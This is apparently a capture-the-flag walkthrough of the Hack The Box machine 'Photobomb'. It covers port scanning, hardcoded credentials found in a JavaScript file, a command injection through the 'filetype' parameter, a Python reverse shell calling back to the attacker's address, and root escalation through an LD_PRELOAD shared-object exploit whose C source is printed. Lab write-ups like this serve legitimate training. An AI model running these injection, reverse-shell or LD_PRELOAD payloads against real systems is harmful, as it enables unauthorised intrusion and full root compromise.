# Photobomb HTB - Easy
## Itay Nafrin | October 17th

### IP = 10.10.11.182

### NMAP 

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx/1.18.0 (Ubuntu)
|http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Web Enum

View the source and enter into the photobomb.js file the you will see the credentials to enter the /printr directory.

view-source: http://photobomb.htb/photobomb.js

input this url: http://pH0t0:b0Mb!@photobomb.htb/printer

After Entering /printer you can see you can download images and when you intercept the download with Burp you can see parameters like "photo", "filetype" and "dimensions" so you can test for code injection by pinging your Host(tun0) like so:

```

photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=png;ping -c 2 10.10.14.153&dimensions=1000x1500

```

right before you forward this request you need to intercept the traffic with tcpdump or simillar tools: 

```

tcpdump -nni tun0

```

now forward the request and see:

```

13:57:54.357293 IP 10.10.14.153.40174 > 10.10.11.182.80: Flags [FP.], seq 2263875648:2263875789, ack 4179447807, win 501, options [nop,nop,TS val 3536004392 ecr 421206325], length 141: HTTP: GET /printer/8452 HTTP/1.1
13:57:54.357399 IP 10.10.14.153.52626 > 10.10.11.182.80: Flags [FP.], seq 3999878915:3999879057, ack 1872341067, win 501, options [nop,nop,TS val 3536004392 ecr 421206313], length 142: HTTP: GET /printer/18498 HTTP/1.1

```

that means it worked and it's pinging.
now let's just input a reverse shell.


```

photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=png;python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.153",9999))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b'&dimensions=1000x1500

```

```

$ rlwrap -cAr nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.153] from (UNKNOWN) [10.10.11.182] 57882
/bin/sh: 0: can't access tty; job control turned off
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
wizard@photobomb:home/wizard/photobomb$ cd ..
wizard@photobomb:home/wizard$ whoami && id && cat user.txt
wizard
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
296d07dd9715235c6e0c5659382be884

```


### Priv Esc

```

$ sudo -l 
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh

```

LD_PRELOAD can be invoked with sudo, let's create a simple PE shell to exploit this.

```

(Host)$ cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/usr/bin/bash");
}

```

Copy this C program and then compile it with gcc.

```
(Host)$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
(Host)$ python3 -m http.server 80
(Target)/home/wizard$ wget http://10.10.14.153/shell.so
(Target)$ sudo LD_PRELOAD=/home/wizard/shell.so /opt/cleanup.sh
/home/wizard# whoami && id && cat /root/root.txt
root
uid=0(root) gid=0(root) groups=0(root)
feb2632bd0ba4a114568a9bd2c191950
```

